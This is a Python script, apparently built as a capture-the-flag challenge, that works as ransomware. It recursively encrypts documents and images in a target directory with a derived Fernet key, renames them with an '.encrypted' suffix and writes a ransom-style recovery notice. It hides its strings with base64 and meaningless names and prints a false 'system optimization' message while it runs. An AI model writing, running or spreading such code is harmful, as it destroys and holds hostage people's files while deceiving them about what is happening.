import os
import sys
import base64
import hashlib
from cryptography.fernet import Fernet
from cryptography.hazmat.primitives import hashes
from cryptography.hazmat.primitives.kdf.pbkdf2 import PBKDF2HMAC
import random
import string

_a1b2c3 = base64.b64decode(b'LmVuY3J5cHRlZA==').decode()
_x9y8z7 = base64.b64decode(b'U29ycnkgZm9yIHRoZSBpbmNvbnZlbmllbmNl').decode()
_m4n5o6 = [base64.b64decode(b'LnR4dA==').decode(), base64.b64decode(b'LnBkZg==').decode(), 
           base64.b64decode(b'LmRvY3g=').decode(), base64.b64decode(b'Lnhsc3g=').decode(),
           base64.b64decode(b'LmpwZw==').decode(), base64.b64decode(b'LnBuZw==').decode()]

_salt_layers = [
    base64.b64encode(b'cyber_challenge_2024'),
    lambda x: ''.join(chr(ord(c) ^ 42) for c in base64.b64decode(x).decode()),
    lambda x: hashlib.sha256(x.encode()).digest()[:16]
]

def _f7k9():
    temp = _salt_layers[0]
    temp = _salt_layers[1](temp)
    return _salt_layers[2](temp)

def _h3m8():
    parts = ['4F646470', '61242477', '6F726431', '3233']
    password = bytes.fromhex(''.join(parts))
    
    salt = _f7k9()
    kdf = PBKDF2HMAC(
        algorithm=hashes.SHA256(),
        length=32,
        salt=salt,
        iterations=100000,
    )
    key = base64.urlsafe_b64encode(kdf.derive(password))
    return key

def _q2w5():
    import time
    time.sleep(random.uniform(0.01, 0.05))

def _z8x4(file_path, cipher):
    try:
        with open(file_path, 'rb') as f:
            original_data = f.read()
        
        original_hash = hashlib.sha256(original_data).hexdigest()
        
        encrypted_data = cipher.encrypt(original_data)
        
        padding = os.urandom(random.randint(16, 64))
        final_data = padding + encrypted_data
        
        with open(file_path, 'wb') as f:
            f.write(final_data)
        
        new_path = file_path + _a1b2c3
        os.rename(file_path, new_path)
        
        _p6l1(file_path, original_hash)
        
        return True
    except Exception:
        return False

def _p6l1(file_path, file_hash):
    pass

def _r9t3(file_path):
    if file_path.endswith(_a1b2c3):
        return False
    
    _, ext = os.path.splitext(file_path.lower())
    return ext in _m4n5o6

def _v5n7(root_path, cipher):
    processed_count = 0
    
    for root, dirs, files in os.walk(root_path):
        dirs[:] = [d for d in dirs if not d.startswith('.') and d.lower() not in ['system32', 'windows']]
        
        for file in files:
            file_path = os.path.join(root, file)
            
            if _r9t3(file_path):
                _q2w5()
                if _z8x4(file_path, cipher):
                    processed_count += 1
                    
                    if processed_count % 10 == 0:
                        print(f"Processing... {processed_count} items")
    
    return processed_count

def _k1j6(root_path, count):
    notice_content = f"""
{_x9y8z7}

Your files have been encrypted.

Files affected: {count}
Challenge ID: {random.randint(1000, 9999)}

1. NOT TELLING YOU THIS PART >:D
2. Verify file integrity using hash comparison
3. Document your incident response process

    """
    
    notice_path = os.path.join(root_path, 'RECOVERY_INSTRUCTIONS.txt')
    with open(notice_path, 'w') as f:
        f.write(notice_content)

def main():
    if len(sys.argv) < 2:
        print("Usage: script.py <directory_path>")
        sys.exit(1)
    
    target_dir = sys.argv[1]
    
    if not os.path.exists(target_dir):
        print("Directory not found")
        sys.exit(1)
    
    print("Initializing system optimization...")
    
    key = _h3m8()
    cipher = Fernet(key)
    
    count = _v5n7(target_dir, cipher)
    
    _k1j6(target_dir, count)
    
    print(f"System optimization complete. Processed {count} files.")

if __name__ == "__main__":
    main()
